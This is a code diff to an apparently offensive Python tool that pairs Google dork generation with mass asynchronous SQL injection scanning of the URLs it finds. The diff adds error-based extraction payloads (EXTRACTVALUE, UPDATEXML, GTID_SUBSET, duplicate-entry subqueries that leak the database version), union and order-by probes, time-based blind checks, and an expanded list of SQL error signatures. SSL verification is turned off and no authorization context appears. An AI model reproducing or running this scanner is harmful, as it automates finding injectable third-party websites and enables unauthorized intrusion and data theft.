@@ -546,21 +546,23 @@ def build_custom_dorks(keywords, dork_type, site_type, page_param, max_count):
     return all_dorks
 
 # ──────────────────────────────────────────────
-#  SQL SCANNER (verified, low false-positive)
+#  SQL SCANNER (verified, XDumpGO-grade)
 # ──────────────────────────────────────────────
 
-ERROR_PAYLOADS = [
-    "'", "''", "\"", "')", "'))", "\";", "';",
-    "\\", "%27",
-]
+PROBE_PAYLOADS = ["'", "\"", "')", "\\", "1'"]
 
-UNION_PAYLOADS = [
+CONFIRM_PAYLOADS = [
+    " AND 1=1--",
+    " AND 1=2--",
+    " AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,version(),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+    " AND EXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e))--",
+    " AND UPDATEXML(1,CONCAT(0x7e,version(),0x7e),1)--",
+    " OR GTID_SUBSET(CONCAT(0x7e,version(),0x7e),0)--",
+    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,version(),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+    "' AND EXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e))--",
+    "' OR GTID_SUBSET(CONCAT(0x7e,version(),0x7e),0)--",
     " union select 1,2,3,4,5,6--",
     " order by 100--",
-    " OR 1=1--",
-    "' OR '1'='1",
-    "') OR ('1'='1",
-    " OR 1=1#",
 ]
 
 TIME_PAYLOADS = [
@@ -580,22 +582,24 @@ SQL_ERRORS = [
     "microsoft ole db provider for sql server",
     "microsoft sql native client error",
     "system.data.sqlclient.sqlexception",
-    "jdbc driver", "jdbcdriver",
     "ora-00933", "ora-01756", "ora-00921",
     "pg_query(): query failed", "pg_exec()",
     "warning: pg_", "unterminated quoted string",
     "sqlite_error", "sqlite3::",
     "dynamic sql error", "syntax error in sql statement",
     "invision power board database error",
-    "driver [pdo_mysql]",
-    "sqlstate[",
+    "driver [pdo_mysql]", "sqlstate[",
+    "duplicate entry", "subquery returns more than 1 row",
+    "incorrect parameter count", "operand should contain 1 column",
+    "xpath syntax error", "illegal mix of collations",
+    "unknown column",
 ]
 
-TIMEOUT = aiohttp.ClientTimeout(total=12)
+SQL_TIMEOUT = aiohttp.ClientTimeout(total=12)
 
 async def _fetch(session, url):
     try:
-        async with session.get(url, timeout=TIMEOUT, ssl=False, allow_redirects=True) as r:
+        async with session.get(url, timeout=SQL_TIMEOUT, ssl=False, allow_redirects=True) as r:
             body = await r.text(errors='ignore')
             return r.status, body, len(body)
     except asyncio.TimeoutError:
@@ -605,11 +609,7 @@ async def _fetch(session, url):
 
 def _find_errors(body):
     body_l = body.lower()
-    found = []
-    for e in SQL_ERRORS:
-        if e in body_l:
-            found.append(e)
-    return found
+    return [e for e in SQL_ERRORS if e in body_l]
 
 def _inject_param(base, params, param_idx, payload):
     new_params = list(params)
@@ -623,118 +623,75 @@ async def check_sql(session, url):
     base_part = url.split("?")[0]
     params = url.split("?")[1].split("&")
 
-    baseline_status, baseline_body, baseline_len = await _fetch(session, url)
-    if baseline_status <= 0:
+    bs_status, bs_body, bs_len = await _fetch(session, url)
+    if bs_status <= 0:
         return None
 
-    baseline_errors = set(_find_errors(baseline_body))
-
-    confirmed_vulns = []
+    bs_errors = set(_find_errors(bs_body))
 
     for i in range(len(params)):
-        # ── Phase 1: Error-based detection ──
-        hits = []
-        for payload in ERROR_PAYLOADS:
+        pname = params[i].split("=")[0] if "=" in params[i] else params[i]
+
+        # ── Phase 1: Probe with basic payloads ──
+        probe_hit = False
+        for payload in PROBE_PAYLOADS:
             test_url = _inject_param(base_part, params, i, payload)
-            status, body, body_len = await _fetch(session, test_url)
+            status, body, blen = await _fetch(session, test_url)
             if status <= 0:
                 continue
+            new_errs = set(_find_errors(body)) - bs_errors
+            if new_errs:
+                probe_hit = True
+                for cp in CONFIRM_PAYLOADS:
+                    cu = _inject_param(base_part, params, i, cp)
+                    cs, cb, cl = await _fetch(session, cu)
+                    if cs <= 0:
+                        continue
+                    cn = set(_find_errors(cb)) - bs_errors
+                    if cn:
+                        return f"[VULN:Error-Based] [param:{pname}] {url}"
+                return f"[VULN:Error-Based] [param:{pname}] {url}"
 
-            new_errors = set(_find_errors(body)) - baseline_errors
-            if new_errors:
-                hits.append({"payload": payload, "url": test_url, "errors": new_errors, "type": "error"})
-                if len(hits) >= 2:
-                    break
-
-            len_diff = abs(body_len - baseline_len)
-            if len_diff > 500 and new_errors:
-                hits.append({"payload": payload, "url": test_url, "errors": new_errors, "type": "error+diff"})
-                if len(hits) >= 2:
-                    break
-
-        if len(hits) >= 2:
-            confirmed_vulns.append({
-                "param": params[i].split("=")[0],
-                "url": hits[0]["url"],
-                "type": "Error-Based",
-                "db": list(hits[0]["errors"])[0],
-                "payloads": len(hits),
-            })
-            continue
-
-        # ── Phase 2: Union/Boolean-based detection ──
-        bool_hits = []
-        for payload in UNION_PAYLOADS:
+        # ── Phase 2: Direct confirm payloads ──
+        for payload in CONFIRM_PAYLOADS:
             test_url = _inject_param(base_part, params, i, payload)
-            status, body, body_len = await _fetch(session, test_url)
+            status, body, blen = await _fetch(session, test_url)
             if status <= 0:
                 continue
+            new_errs = set(_find_errors(body)) - bs_errors
+            if new_errs:
+                return f"[VULN:Error-Based] [param:{pname}] {url}"
+            ldiff = abs(blen - bs_len)
+            if "~" in body and ldiff > 100 and "0x7e" not in bs_body:
+                return f"[VULN:Data-Extract] [param:{pname}] {url}"
+            if ldiff > 2000 and status != bs_status:
+                return f"[VULN:Boolean] [param:{pname}] {url}"
 
-            new_errors = set(_find_errors(body)) - baseline_errors
-            len_diff = abs(body_len - baseline_len)
-
-            if new_errors:
-                bool_hits.append({"payload": payload, "url": test_url, "type": "union"})
-                if len(bool_hits) >= 2:
-                    break
-
-            if len_diff > 1000 and status != baseline_status:
-                bool_hits.append({"payload": payload, "url": test_url, "type": "boolean"})
-                if len(bool_hits) >= 2:
-                    break
-
-        if len(bool_hits) >= 2:
-            confirmed_vulns.append({
-                "param": params[i].split("=")[0] if "=" in params[i] else params[i],
-                "url": bool_hits[0]["url"],
-                "type": "Union/Boolean",
-                "db": "unknown",
-                "payloads": len(bool_hits),
-            })
-            continue
-
-        # ── Phase 3: Time-based blind detection ──
+        # ── Phase 3: Time-based blind ──
         for tpl, db_type in TIME_PAYLOADS:
-            short_payload = tpl.format(delay=0)
-            test_url_short = _inject_param(base_part, params, i, short_payload)
+            short_url = _inject_param(base_part, params, i, tpl.format(delay=0))
             t1 = asyncio.get_event_loop().time()
-            s1, _, _ = await _fetch(session, test_url_short)
+            s1, _, _ = await _fetch(session, short_url)
             time_short = asyncio.get_event_loop().time() - t1
-
             if s1 <= 0:
                 continue
 
-            long_payload = tpl.format(delay=5)
-            test_url_long = _inject_param(base_part, params, i, long_payload)
+            long_url = _inject_param(base_part, params, i, tpl.format(delay=5))
             t2 = asyncio.get_event_loop().time()
-            s2, _, _ = await _fetch(session, test_url_long)
+            s2, _, _ = await _fetch(session, long_url)
             time_long = asyncio.get_event_loop().time() - t2
-
             if s2 <= 0:
                 continue
 
             if time_long >= 4.5 and time_long > time_short + 3.0:
-                long_payload2 = tpl.format(delay=3)
-                test_url_verify = _inject_param(base_part, params, i, long_payload2)
+                verify_url = _inject_param(base_part, params, i, tpl.format(delay=3))
                 t3 = asyncio.get_event_loop().time()
-                s3, _, _ = await _fetch(session, test_url_verify)
-                time_verify = asyncio.get_event_loop().time() - t3
+                s3, _, _ = await _fetch(session, verify_url)
+                time_v = asyncio.get_event_loop().time() - t3
+                if time_v >= 2.5 and time_v > time_short + 1.5:
+                    return f"[VULN:Time-Blind({db_type})] [param:{pname}] {url}"
 
-                if time_verify >= 2.5 and time_verify > time_short + 1.5:
-                    confirmed_vulns.append({
-                        "param": params[i].split("=")[0] if "=" in params[i] else params[i],
-                        "url": test_url_long,
-                        "type": f"Time-Based Blind ({db_type})",
-                        "db": db_type,
-                        "payloads": 2,
-                    })
-                    break
-
-    if not confirmed_vulns:
-        return None
-
-    v = confirmed_vulns[0]
-    return f"[VULN:{v['type']}] [param:{v['param']}] {url}"
+    return None
 
 # ──────────────────────────────────────────────
 #  GLOBAL QUEUE WITH POSITION TRACKING
